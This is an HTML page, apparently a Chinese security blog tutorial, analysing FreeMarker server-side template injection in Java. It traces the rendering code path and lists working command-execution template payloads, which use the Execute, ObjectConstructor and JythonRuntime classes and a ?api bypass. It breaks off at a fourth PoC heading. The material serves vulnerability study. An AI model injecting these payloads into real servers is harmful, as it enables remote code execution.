@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Java OWASP SSTI 学习 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java OWASP SSTI 学习</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-11-07 11:21:10</span>
+        <span class="mobile">2022-11-07 11:21</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-11-24 11:55:23</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>6.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>26 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近和 <a target="_blank" rel="noopener" href="https://f1or.cn/">F1or</a> 大师傅一起挖洞的时候发现一处某 CMS SSTI 的 0day，之前自己在复现 jpress 的一些漏洞的时候也发现了 SSTI 这个洞杀伤力之大。今天来好好系统学习一手。</p>
+<ul>
+<li>有三个最重要的模板，其实模板引擎本质上的原理差不多，因为在 SpringBoot 初学习的阶段我就已经学习过 Thymeleaf 了，所以大体上老生常谈的东西就不继续讲了。</li>
+</ul>
+<p>三个模板的模板注入攻击差距其实还是有点大的，而且 Java 的 SSTI 和 Python Flask 的一些 SSTI 差距有点大。</p>
+<h2 id="0x02-FreeMarker-SSTI"><a href="#0x02-FreeMarker-SSTI" class="headerlink" title="0x02 FreeMarker SSTI"></a>0x02 FreeMarker SSTI</h2><p>FreeMarker 官网：<a target="_blank" rel="noopener" href="http://freemarker.foofun.cn/index.html">http://freemarker.foofun.cn/index.html</a></p>
+<p>对应版本是 2.3.23，一会儿我们搭建环境的时候也用这个版本</p>
+<h3 id="FreeMarker-基础语法"><a href="#FreeMarker-基础语法" class="headerlink" title="FreeMarker 基础语法"></a>FreeMarker 基础语法</h3><p>关于文本与注释，本文不再强调，重点看插值与 FTL 指令。</p>
+<h4 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h4><ul>
+<li>插值也叫 Interpolation，即 <code>$&#123;..&#125;</code> 或者 <code>#&#123;..&#125;</code> 格式的部分，将使用数据模型中的部分替代输出</li>
+</ul>
+<p>比如这一个 .ftl 文件</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hello $&#123;name&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/css/main.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hello-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello $&#123;name&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>   
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>那么 <code>$&#123;name&#125;</code> 的数据就会从传参里面拿，对应的这个是在 <code>addAttribute</code> 中的 name 参数</li>
+</ul>
+<h4 id="FTL-指令"><a href="#FTL-指令" class="headerlink" title="FTL 指令"></a>FTL 指令</h4><p>FTL 指令以 <code>#</code> 开头，其他语法和 HTML 大致相同。</p>
+<blockquote>
+<p>我这里其实也花了不少时间看了 FreeMarker 的基础语法，但是并非很透彻，就不误人子弟了，有兴趣的师傅可以自己前往 FreeMarker 手册查看。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://freemarker.apache.org/">https://freemarker.apache.org/</a> </p>
+<h3 id="FreeMarker-SSTI-成因与攻击面"><a href="#FreeMarker-SSTI-成因与攻击面" class="headerlink" title="FreeMarker SSTI 成因与攻击面"></a>FreeMarker SSTI 成因与攻击面</h3><p>看了一些文章，有些地方有所疏漏，先说 SSTI 的攻击面吧，我们都知道 SSTI 的攻击面其实是模板引擎的渲染，所以我们要让 Web 服务器将 HTML 语句渲染为模板引擎，前提是要先有 HTML 语句。那么 HTML 如何才能被弄上去呢？这就有关乎我们的攻击面了。</p>
+<ul>
+<li>将 HTML 语句放到服务器上有两种方法：</li>
+<li>1、文件上传 HTML 文件。</li>
+<li>2、若某 CMS 自带有模板编辑功能，这种情况非常多。</li>
+</ul>
+<p>因为之前有接触过 Thymeleaf 的 SSTI，Thymeleaf 的 SSTI 非常锋利， Thymeleaf SSTI 的攻击往往都是通过传参即可造成 RCE（当然这段话很可能是不严谨的</p>
+<p>在刚接触 FreeMarker 的 SSTI 的时候，我误以为它和 Thyemelaf 一样，直接通过传参就可以打，后来发现我的想法是大错特错。</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ul>
+<li>一些开发的基本功，因篇幅限制，我也不喜放这些东西，贴个项目地址吧</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/CodeReview">https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/CodeReview</a></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>前文我有提到，FreeMarker 的 SSTI 必须得是获取到 HTML，再把它转换成模板，从而引发漏洞，所以这里要复现，只能把 HTML 语句插入到 .ftl 里面，太生硬了简直。。。。。不过和 F1or 师傅一起挖出来的 0day 则是比较灵活，有兴趣的师傅可以滴一下我</p>
+<p>payload：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">"freemarker.template.utility.Execute"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>$<span class="token punctuation">&#123;</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/FreeMarkerExectorPayload.png" class="">
+
+<p>构造出这个 PoC 的原因是 <code>freemarker.template.utility.Execute</code> 类里面存在如下图所示的命令执行方法，都写到脸上来了。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/ExecuteVul.png" class="">
+
+<p>漏洞复现如图</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/ExecuteCalc.png" class="">
+
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>我们要分析的是，MVC 的思维，以及如何走到这个危险类 ———— <code>freemarker.template.utility.Execute</code> 去的。</p>
+<p>下一个断点在 <code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>，开始调试</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/createView.png" class="">
+
+<p>跟进 <code>super.createView()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SuperCreateView.png" class="">
+
+<p>进一步跟进 <code>loadView()</code> 以及 <code>buildView()</code>，这些方法的业务意义都比较好理解，先 create 一个 View 视图，再将其 load 进来，最后再 build。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/loadView.png" class="">
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/buildView.png" class="">
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SuperBuildView.png" class="">
+
+<p>在 <code>buildView()</code> 方法当中，先通过 <code>this.instantiateView()</code> 的方式 new 了一个 <code>FreeMarkerView</code> 类，又进行了一些基础赋值，将我们的 View Build 了出来（也就是 View 变得有模有样了）</p>
+<p>继续往下走，回到 <code>loadView()</code> 方法，<code>loadView()</code> 方法调用了 <code>view.checkResource()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/checkResource.png" class="">
+
+<p><code>checkResource()</code> 方法做了两件事，第一件事是判断 <code>Resource</code> 当中的 url 是否为空，也就是判断是否存在 resource，如果 url 都没东西，那么后续的模板引擎加载就更不用说了；第二件事是进行 <code>template</code> 的获取，也可以把这理解为准备开始做模板引擎加载的业务了。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/checkResourceBusiness.png" class="">
+
+<p>跟进 <code>getTemplate()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/getTemplate.png" class="">
+
+<p>首先做了一些赋值判断，再判断 Template 的存在，我们跟进 <code>this.cache.getTemplate</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/MaybeMissingTemplate.png" class="">
+
+<p>这里从 cache 里面取值，而在我们 <code>putTemplate</code> 设置模板的时候，也会将至存储到 cache中。</p>
+<p>跟进 <code>getTemplateInternal()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/getTemplateInternal.png" class="">
+
+<p>先做了一些基本的判断，到 202 行，跟进 <code>lookupTemplate()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/lookupTemplate.png" class="">
+
+<p>这里代码很冗杂，最后的结果是跟进 &#96;freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/lookupWithLocalizedThenAcquisitionStrategy.png" class="">
+
+<p>代码会先拼接 <code>_zh_CN</code>，再寻找未拼接 <code>_zh_CN</code> 的模板名，调用 <code>this.findTemplateSource(path)</code> 获取模板实例。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/findTemplateSource.png" class="">
+
+<p>这里就获取到了 handle 执行返回的模板视图实例，这里我 IDEA 没有走过去，就跟着奶思师傅的文章先分析了。</p>
+<p><code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code> 流程</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/doDispatch.png" class="">
+
+<p>handle 执行完成后调用 <code>this.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);</code> 进行模板解析。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/processDispatchResult.png" class="">
+
+<p>调用 <code>view.render(mv.getModelInternal(), request, response);</code> 一路跟进至 <code>org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/doRender.png" class="">
+
+<p>跟进 <code>this.processTemplate()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/processTemplate.png" class="">
+
+<p>跟进 <code>process()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/SuperProcess.png" class="">
+
+<ul>
+<li><code>process()</code> 方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。</li>
+</ul>
+<p>在 <code>process()</code> 方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/visitForeach.png" class="">
+
+<blockquote>
+<p>在读取到每一条 freeMarker 表达式语句的时候，会二次调用 <code>visit()</code> 方法，而 <code>visit()</code> 方法又调用了 <code>element.accept()</code>，跟进</p>
+</blockquote>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/accept.png" class="">
+
+<p>跟进 <code>calculateInterpolatedStringOrMarkup()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/calculateInterpolatedStringOrMarkup.png" class="">
+
+<p><code>calculateInterpolatedStringOrMarkup()</code> 方法做的业务是将模型强制为字符串或标记，跟进 <code>eval()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/eval.png" class="">
+
+<p><code>eval()</code> 方法简单判断了 <code>constantValue</code> 是否为 null，这里 <code>constantValue</code> 为 null，跟进 <code>this._eval()</code>，一般的 <code>_eval()</code> 方法只是将 evn 获取一下，但是对于 ftl 语句就不是这样了，一般的 <code>_eval()</code> 方法如下</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/normalEval.png" class="">
+
+<p>而对于 ftl 表达式来说，<code>accept</code> 方法是这样的</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/elementThis.png" class="">
+
+<p>跟进一下 <code>accept()</code> 方法</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/FtlAccept.png" class="">
+
+<p>做了一系列基础判断，先判断 <code>namespaceExp</code> 是否为 null，接着又判断 <code>this.operatorType </code> 是否等于 65536，到第 105 行，跟进 <code>eval()</code> 方法，再跟进 <code>_eval()</code></p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/evalFtl.png" class="">
+
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/execftl.png" class="">
+
+<p>我们可以看到 <code>targetMethod</code> 目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类，也就是说这一个语句相当于</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Object</span> result <span class="token operator">=</span> targetMethod<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>argumentStrings<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// 等价于</span>
+
+<span class="token class-name">Object</span> result <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">freemarker<span class="token punctuation">.</span>template<span class="token punctuation">.</span>utility<span class="token punctuation">.</span></span>Execute</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>argumentStrings<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而这一步并非直接进行命令执行，而是先把这个类通过 <code>newInstance()</code> 的方式进行初始化。</p>
+<p>命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/Calc.png" class="">
+
+<p>至此，分析结束，很有意思的一个流程分析。</p>
+<img src="/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0/End.png" class="">
+
+<h3 id="FreeMarker-SSTI-的攻防二象性"><a href="#FreeMarker-SSTI-的攻防二象性" class="headerlink" title="FreeMarker SSTI 的攻防二象性"></a>FreeMarker SSTI 的攻防二象性</h3><p>我们目前的 PoC 是这么打的</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.Execute<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("Calc")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这是因为 FreeMarker 的内置函数 new 导致的，下面我们简单介绍一下 FreeMarker的两个内置函数—— <code>new</code> 和 <code>api</code></p>
+<h4 id="内置函数-new"><a href="#内置函数-new" class="headerlink" title="内置函数 new"></a>内置函数 new</h4><p>可创建任意实现了 <code>TemplateModel</code> 接口的 Java 对象，同时还可以触发没有实现  <code>TemplateModel</code> 接口的类的静态初始化块。<br>以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 <code>TemplateModel</code> 接口的 <code>freemarker.template.utility.JythonRuntime</code> 和<code>freemarker.template.utility.Execute</code></p>
+<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p><code>value?api</code> 提供对 value 的 API（通常是 Java API）的访问，例如 <code>value?api.someJavaMethod()</code> 或 <code>value?api.someBeanProperty</code>。可通过 <code>getClassLoader</code>获取类加载器从而加载恶意类，或者也可以通过 <code>getResource</code>来实现任意文件读取。<br>但是，当<code>api_builtin_enabled</code>为 true 时才可使用 api 函数，而该配置在 <strong>2.3.22 版本</strong>之后默认为 false。</p>
+<ul>
+<li>由此我们可以构造出一系列的 bypass PoC</li>
+</ul>
+<p>POC1</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign classLoader<span class="token operator">=</span>object<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span>protectionDomain<span class="token punctuation">.</span>classLoader<span class="token operator">></span> 
+<span class="token operator">&lt;</span>#assign clazz<span class="token operator">=</span>classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"ClassExposingGSON"</span><span class="token punctuation">)</span><span class="token operator">></span> 
+<span class="token operator">&lt;</span>#assign field<span class="token operator">=</span>clazz<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token function">getField</span><span class="token punctuation">(</span><span class="token string">"GSON"</span><span class="token punctuation">)</span><span class="token operator">></span> 
+<span class="token operator">&lt;</span>#assign gson<span class="token operator">=</span>field<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">></span> 
+<span class="token operator">&lt;</span>#assign ex<span class="token operator">=</span>gson<span class="token operator">?</span>api<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"freemarker.template.utility.Execute"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span> 
+$<span class="token punctuation">&#123;</span><span class="token function">ex</span><span class="token punctuation">(</span><span class="token string">"Calc"</span>"<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>POC2</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">"freemarker.template.utility.ObjectConstructor"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>$<span class="token punctuation">&#123;</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token punctuation">,</span><span class="token string">"Calc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>POC3</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>#assign value<span class="token operator">=</span><span class="token string">"freemarker.template.utility.JythonRuntime"</span><span class="token operator">?</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token annotation punctuation">@value</span><span class="token operator">></span><span class="token keyword">import</span> <span class="token namespace">os</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>POC4</p>
